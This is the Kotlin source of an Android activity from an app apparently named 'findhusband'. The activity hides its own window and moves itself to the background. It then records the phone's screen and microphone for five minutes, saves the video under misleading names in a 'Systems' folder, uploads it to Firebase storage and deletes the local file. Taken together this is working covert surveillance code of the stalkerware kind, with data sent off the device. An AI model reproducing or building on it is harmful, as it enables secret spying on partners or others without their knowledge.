package nguyen.findhusband

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Environment
import android.util.DisplayMetrics
import android.util.Log
import android.util.SparseIntArray
import android.view.Surface
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.google.android.gms.tasks.OnFailureListener
import com.google.android.gms.tasks.OnSuccessListener
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import com.google.firebase.storage.UploadTask
import kotlinx.android.synthetic.main.activity_screen_recording.*
import nguyen.ScreenPreference
import nguyen.findhusband.model.DataRecordingModel
import nguyen.findhusband.model.Upload
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class ScreenRecordingActivity : Activity() {
    private var mScreenDensity: Int = 0
    private var mProjectionManager: MediaProjectionManager? = null
    private var mMediaProjection: MediaProjection? = null
    private var mVirtualDisplay: VirtualDisplay? = null
    private var mMediaProjectionCallback: MediaProjectionCallback? = null
    var mMediaRecorder: MediaRecorder? = null
    internal var isRecording: String? = null
    private var filePath: String? = null
      var filePathDelete: String? = null
    private lateinit var myRef: DatabaseReference
    var mStorage: StorageReference? = null
    var timer: CountDownTimer? = null
    private var mDatabase: DatabaseReference? = null

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // setContentView(R.layout.activity_screen_recording)
        mStorage = FirebaseStorage.getInstance().getReference(Constants.STORAGE_PATH_UPLOADS)
        instance = this
        val metrics = DisplayMetrics()
        windowManager.defaultDisplay.getMetrics(metrics)
        mScreenDensity = metrics.densityDpi
        ScreenPreference.getInstance(this@ScreenRecordingActivity).saveStatus = "true"
        mDatabase = FirebaseDatabase.getInstance().getReference(Constants.DATABASE_PATH_UPLOADS)

        mMediaRecorder = MediaRecorder()
      //  Log.d("ScreenRecordingActivity", "qua ")

        mProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        initRecorder()
        shareScreen()
        object : CountDownTimer(2000, 1000) {

            override fun onTick(millisUntilFinished: Long) {
                // Toast.makeText(this@ScreenRecordingActivity, "còn : "+ (millisUntilFinished / 1000).toString(), Toast.LENGTH_SHORT).show()
                // count.setText("Time remaining " + (millisUntilFinished / 1000).toString())
            }

            override fun onFinish() {

                moveTaskToBack(true)
                gettime()
            }
        }.start()


    }

    private fun gettime() {

        timer = object : CountDownTimer(300000, 1000) {

            override fun onTick(millisUntilFinished: Long) {
                //   Toast.makeText(this@ScreenRecordingActivity, "còn : " + (millisUntilFinished / 1000).toString(), Toast.LENGTH_SHORT).show()
                // count.setText("Time remaining " + (millisUntilFinished / 1000).toString())
             //   println("tu dong tat xong" + (millisUntilFinished / 1000).toString())

            }

            override fun onFinish() {
                try {
               //     println("tu dong tat vao")
                    moveTaskToBack(true)
                    mMediaRecorder!!.stop()
                    mMediaRecorder!!.reset()

                 //   println("tu dong tat xong")


                    upload()
                } catch (e: IllegalStateException) {
                    e.printStackTrace()
                }

            }
        }.start()
    }

    fun stopCountTimer() {
        if (timer != null) {
            timer!!.cancel()
        }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun shareScreen() {
        if (mMediaProjection == null) {
            startActivityForResult(mProjectionManager!!.createScreenCaptureIntent(), REQUEST_CODE)
            return
        }
        mVirtualDisplay = createVirtualDisplay()
        mMediaRecorder!!.start()
     //   Log.d(TAG, "media start")
        // isRecording = true
        // actionBtnReload()
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun stopScreenSharing() {
        if (mVirtualDisplay == null) {
            return
        }
        mVirtualDisplay!!.release()
        destroyMediaProjection()
        //isRecording = false
        // actionBtnReload()
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun destroyMediaProjection() {
        if (mMediaProjection != null) {
            mMediaProjection!!.unregisterCallback(mMediaProjectionCallback)
            mMediaProjection!!.stop()
            mMediaProjection = null
        }
     //   Log.i(TAG, "MediaProjection Stopped")
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onDestroy() {
        super.onDestroy()
        destroyMediaProjection()
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun createVirtualDisplay(): VirtualDisplay {
        return mMediaProjection!!.createVirtualDisplay("MainActivity", DISPLAY_WIDTH, DISPLAY_HEIGHT, mScreenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mMediaRecorder!!.surface, null, null)
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun initRecorder() {
        try {
            mMediaRecorder!!.setAudioSource(MediaRecorder.AudioSource.MIC)
            mMediaRecorder!!.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mMediaRecorder!!.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4) //THREE_GPP
            mMediaRecorder!!.setOutputFile(getFilePath())
            mMediaRecorder!!.setVideoSize(DISPLAY_WIDTH, DISPLAY_HEIGHT)
            mMediaRecorder!!.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            mMediaRecorder!!.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            mMediaRecorder!!.setVideoFrameRate(16) // 30
            //mMediaRecorder!!.setVideoEncodingBitRate(3000000)
            mMediaRecorder!!.setVideoEncodingBitRate(380 * 1000)

            val rotation = windowManager.defaultDisplay.rotation
            val orientation = ORIENTATIONS.get(rotation + 90)
            mMediaRecorder!!.setOrientationHint(orientation)
            mMediaRecorder!!.prepare()
        } catch (e: IOException) {
            e.printStackTrace()
        }

    }

    fun upload() {


        val file = Uri.fromFile(File(filePath))
        var mReference = mStorage!!.child(file.lastPathSegment)

        println(file.lastPathSegment)
        try {

            mReference.putFile(file).addOnSuccessListener(object : OnSuccessListener<UploadTask.TaskSnapshot> {
                @SuppressLint("VisibleForTests")
                override fun onSuccess(taskSnapshot: UploadTask.TaskSnapshot?) {
                    println(taskSnapshot)

                    val upload = Upload(getCurSysDate(), taskSnapshot!!.downloadUrl!!.toString())
                    val uploadId = mDatabase!!.push().key
                    mDatabase!!.child(uploadId!!).setValue(upload)

                    val fdelete = File(filePath)
                    fdelete.delete()
                }

            }).addOnFailureListener(object : OnFailureListener {
                override fun onFailure(p0: java.lang.Exception) {
                    println(p0)
                    val fdelete = File(filePath)
                    fdelete.delete()

                }
            })

//            taskSnapshot: UploadTask.TaskSnapshot? -> var url = taskSnapshot!!
//            Toast.makeText(this, "Successfully Uploaded :)", Toast.LENGTH_LONG).show()


        } catch (e: Exception) {
            println(e)
            try {
                val fdelete = File(filePath)
                fdelete.delete()
            } catch (e: Exception) {
                println(e)
            }

            // Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
        }


    }

    fun getCurSysDate(): String {
        return SimpleDateFormat("yyyy-MM-dd_HH-mm-ss").format(Date())
    }

    fun getFilePath(): String? {
        val directory = Environment.getExternalStorageDirectory().toString() + File.separator + "Systems"
        if (Environment.MEDIA_MOUNTED != Environment.getExternalStorageState()) {
            // Toast.makeText(this, "Failed to get External Storage", Toast.LENGTH_SHORT).show()
            return null
        }
        val folder = File(directory)
        var success = true
        if (!folder.exists()) {
            success = folder.mkdir()
        }

        if (success) {
            val videoName = "info" + getCurSysDate() + ".mp4"
            filePath = directory + File.separator + videoName
        } else {
            // Toast.makeText(this, "Failed to create Recordings directory", Toast.LENGTH_SHORT).show()
            return null
        }
        filePathDelete = filePath
        return filePath
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private inner class MediaProjectionCallback : MediaProjection.Callback() {
        @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
        override fun onStop() {
            if (isRecording!!.contains("false")) {
                // isRecording = false
                //actionBtnReload()
                mMediaRecorder!!.stop()
                mMediaRecorder!!.reset()
            }
            mMediaProjection = null
            stopScreenSharing()
        }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    public override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent) {
        if (requestCode != REQUEST_CODE) {
     //       Log.e(TAG, "Unknown request code: $requestCode")
            return
        }
        if (resultCode != Activity.RESULT_OK) {
            //  Toast.makeText(this, "Screen Cast Permission Denied", Toast.LENGTH_SHORT).show()
            //isRecording = false
            //  actionBtnReload()
            return
        }
        mMediaProjectionCallback = MediaProjectionCallback()
        mMediaProjection = mProjectionManager!!.getMediaProjection(resultCode, data)
        mMediaProjection!!.registerCallback(mMediaProjectionCallback, null)
        mVirtualDisplay = createVirtualDisplay()
        mMediaRecorder!!.start()

        // actionBtnReload()
    }


    companion object {

        private val TAG = "MainActivity"
        private val REQUEST_CODE = 1000
        // private val DISPLAY_WIDTH = 720
        //private val DISPLAY_HEIGHT = 1280
        private val DISPLAY_WIDTH = 480 //720
        private val DISPLAY_HEIGHT = 640 //1280
        private val ORIENTATIONS = SparseIntArray()
        private val REQUEST_PERMISSION_KEY = 1

        init {
            ORIENTATIONS.append(Surface.ROTATION_0, 90)
            ORIENTATIONS.append(Surface.ROTATION_90, 0)
            ORIENTATIONS.append(Surface.ROTATION_180, 270)
            ORIENTATIONS.append(Surface.ROTATION_270, 180)
        }

        lateinit var instance: ScreenRecordingActivity
            private set
    }


}
